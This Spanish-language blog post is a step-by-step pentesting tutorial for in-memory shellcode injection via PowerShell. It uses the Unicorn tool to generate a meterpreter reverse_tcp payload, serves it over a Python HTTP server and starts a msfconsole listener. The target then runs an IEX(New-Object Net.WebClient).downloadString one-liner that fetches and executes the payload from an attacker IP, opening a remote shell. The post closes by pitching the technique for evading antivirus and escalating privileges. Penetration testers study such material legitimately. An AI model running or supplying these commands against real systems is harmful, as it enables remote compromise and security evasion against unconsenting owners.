---
title: "Ataque mediante Powershell inyectando una ShellCode directamente en memoria"
description: "Inyectando una shellcode directamente en memoria mediante Powershell Cuando logramos ejecutar código remoto en un entorno windows podemos tener inconvenientes en cuando la gener…"
pubDate: 2017-12-30
updatedDate: 2018-01-04
author: "Miguel Zabala"
tags: ["Pentesting"]
legacyUrl: "https://nullsectorblog.co/ataque-mediante-powershell-inyectando-una-shellcode-directamente-memoria/"
---
## Inyectando una shellcode directamente en memoria mediante Powershell

![Ataque mediante Powershell inyectando una ShellCode directamente en memoria](https://nullsector.co/wp-content/uploads/2017/12/powershell-logo.png)

Cuando logramos ejecutar código remoto en un entorno windows podemos tener inconvenientes en cuando la generación de una shell para iniciar con la escalda de privilegios, un método muy conocido es aprovechar Powershell para inyectar una ShellCode directamente en memoria para comprometer el sistema.

1 – Descargamos Unicorn

git clone https://github.com/trustedsec/unicorn

![Ataque mediante powershell injectando una shellcode directamente en memoria](https://nullsector.co/wp-content/uploads/2017/12/Captura1-300x52.png)

2 – Accedemos a el directorio creado en la ruta actual

cd unicorn/

![Ataque mediante powershell injectando una shellcode directamente en memoria](https://nullsector.co/wp-content/uploads/2017/12/Captura2-300x93.png)

3 – Ejecutamos la instrucción para que se genere el exploit en un .txt a lo cual solo enviaremos dos parámetros la ip y el puerto del equipo que recibirá la Shell. (Recuerda remplazar inclusive los <>)

./unicorn.py windows/meterpreter/reverse\_tcp <ip> <port>

![Ataque mediante Powershell inyectando una ShellCode directamente en memoria](https://nullsector.co/wp-content/uploads/2017/12/Captura5-300x20.png)

4 – Ahora procedemos a verificar que existan los archivos «unicorn.rc» y «powershell\_attack.txt» en el directorio actual

ls

![Inyectando una shellcode directamente en memoria mediante Powershell](https://nullsector.co/wp-content/uploads/2017/12/Captura4-300x27.png)

5 – Ahora debemos cambiar la extensión del archivo powershell\_attack.txt a exploit.html y procedemos a utilizar SimpleHTTPServer para poder alojar el exploit y descargarlo desde la maquina objetivo:

cp powershell\_attack.txt exploit.html
python -m SimpleHTTPServer 1236

![](https://nullsector.co/wp-content/uploads/2017/12/Captura6-300x51.png)

6 – Procedemos a abrir nuestra msfconsole con los parámetros del archivo «unicorn.rc»

msfconsole -r unicorn.rc

![Ataque mediante Powershell inyectando una ShellCode directamente en memoria](https://nullsector.co/wp-content/uploads/2017/12/Captura7-300x177.png)

8 – Nuestra msfconsole queda en escucha para cuando se ejecute el script en la maquina objetivo, desde el objetivo debemos ejecutar la siguiente linea de código donde interpretara y creara la inyección de shellcode

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.121:1236/exploit.html')"

cuando logremos ejecutar esta linea podremos ver que la sesión que tenemos activa en el meterpreter se abrirá una shell

![Ataque mediante Powershell inyectando una ShellCode directamente en memoria](https://nullsector.co/wp-content/uploads/2017/12/Captura8-300x113.png)

ahora tenemos una shell interactiva con la cual podemos proceder a subir los privilegios y comprometer totalmente la maquina, espero esta información sea de utilidad en algún momento que necesites evadir un Antivirus.

Saludos

**0x00Sector![Social](https://nullsector.co/wp-admin/post.php?post=365&action=edit#wpseo-meta-section-social)**
